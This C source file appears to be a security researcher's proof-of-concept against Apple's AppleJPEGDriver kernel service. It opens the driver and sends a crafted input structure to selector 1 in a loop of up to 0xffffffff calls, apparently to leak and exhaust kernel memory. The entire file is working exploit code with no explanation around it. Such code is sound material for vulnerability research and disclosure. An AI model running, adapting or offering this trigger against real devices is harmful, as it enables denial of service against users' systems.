//
//  AppleJPEGDriver-memleak.c
//  AppleJPEGDriver-memleak
//
//  Created by Brandon Azad on 11/18/17.
//  Copyright © 2017 Brandon Azad. All rights reserved.
//

#include "AppleJPEGDriver-memleak.h"

#include "IOKit.h"
#include <stdio.h>

#define ERROR(fmt, ...) printf("Error: "fmt"\n", ##__VA_ARGS__)

void AppleJPEGDriver_memleak_main() {
	printf("AppleJPEGDriver-memleak\n");
	io_service_t service = IOServiceGetMatchingService(
			kIOMasterPortDefault,
			IOServiceMatching("AppleJPEGDriver"));
	if (service == IO_OBJECT_NULL) {
		ERROR("%s: %x", "IOServiceGetMatchingService", service);
		return;
	}
	io_connect_t connect;
	kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &connect);
	IOObjectRelease(service);
	if (kr != KERN_SUCCESS) {
		ERROR("%s: %x", "IOServiceOpen", kr);
		return;
	}
	uint32_t  selector                                = 1;
	uint32_t  input_scalars_count                     = 0;
	uint64_t *input_scalars                           = NULL;
	size_t    input_structure_size                    = 0x58;
	uint8_t   input_structure[input_structure_size];
	uint32_t  output_scalars_count                    = 0;
	uint64_t *output_scalars                          = NULL;
	size_t    output_structure_size                   = 0x58;
	uint8_t   output_structure[output_structure_size];
	*(uint32_t *)(input_structure + 0x04) = 1;		// input_jpeg_file_size
	*(uint32_t *)(input_structure + 0x08) = 0x18344;	// ???
	*(uint32_t *)(input_structure + 0x0c) = 7;		// output_buffer_size
	*(uint32_t *)(input_structure + 0x14) = 1;		// pixel_x
	*(uint32_t *)(input_structure + 0x18) = 1;		// pixel_y
	*(uint32_t *)(input_structure + 0x2c) = 0;		// subsampling_mode
	*(uint32_t *)(input_structure + 0x4c) = 1;		// decode_width
	*(uint32_t *)(input_structure + 0x50) = 1;		// decode_height
	for (size_t i = 0; i < 0xffffffff; i++) {
		uint32_t output_scalars_count_result  = output_scalars_count;
		size_t   output_structure_size_result = output_structure_size;
		kr = IOConnectCallMethod(
				connect, selector,
				input_scalars,    input_scalars_count,
				input_structure,  input_structure_size,
				output_scalars,   &output_scalars_count_result,
				output_structure, &output_structure_size_result);
	}
	IOServiceClose(connect);
	printf("AppleJPEGDriver-memleak done\n");
}
